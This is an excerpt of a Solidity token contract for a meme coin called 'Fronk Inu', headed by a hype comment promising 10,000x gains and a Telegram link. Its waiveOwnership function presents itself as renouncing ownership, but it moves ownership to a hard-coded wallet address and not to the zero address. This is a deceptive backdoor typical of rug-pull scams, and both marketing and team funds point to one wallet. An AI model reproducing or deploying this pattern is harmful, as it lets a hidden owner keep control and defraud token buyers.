...
/**
   SOLONA CHAIN FRONK INU 10.000X
   https://t.me/FronkInuEnrty
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x4db032EcB56105c81BB74f618b545A2De4391F7D));
        _owner = address(0x4db032EcB56105c81BB74f618b545A2De4391F7D);
    }
...
contract FronkInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Fronk Inu";
    string private _symbol = "FRONK INU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x42b5F44340380f745c72B8eca39c5C4dA3Afdb59);
    address payable public teamWalletAddress = payable(0x42b5F44340380f745c72B8eca39c5C4dA3Afdb59);
